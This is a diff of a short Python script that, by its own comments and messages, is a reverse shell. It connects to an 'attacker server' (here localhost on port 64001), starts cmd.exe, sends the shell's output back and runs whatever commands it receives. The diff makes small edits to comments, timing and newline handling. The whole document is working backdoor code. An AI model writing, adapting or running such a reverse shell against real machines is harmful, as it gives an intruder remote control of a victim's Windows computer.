@@ -1,21 +1,21 @@
-from subprocess import *
-from socket import *
 import os
 import time
+from subprocess import *
+from socket import *
 
-# Connect to attacker server
+# Connect to attacker server to recieve commands
 server = socket(AF_INET, SOCK_STREAM)
-server.connect(("localhost", 9000))
+server.connect(('localhost', 64001))
 
-# Run command prompt program in separate thread
+# Run command prompt / terminal program in background
 cmd = Popen(['cmd.exe'],  stdin=PIPE, stdout=PIPE, stderr=PIPE)
 
-# Run until 
 try:
+  # Run forever until connection with server is closed
   while True:
 
-    # delay waits for command prompt to finish executing command
-    time.sleep(0.1)
+    # Delay waits for command prompt to finish executing command
+    time.sleep(0.2)
 
     # Send any output/response to attacker
     output = os.read(cmd.stdout.fileno(), 2048)
@@ -23,7 +23,9 @@ try:
 
     # Run the command sent by the attacker
     command = server.recv(2048)
-    os.write(cmd.stdin.fileno(), command)
+  
+    if command != '\n':
+      os.write(cmd.stdin.fileno(), command)
 
 except:
   print('Terminating reverse shell!')
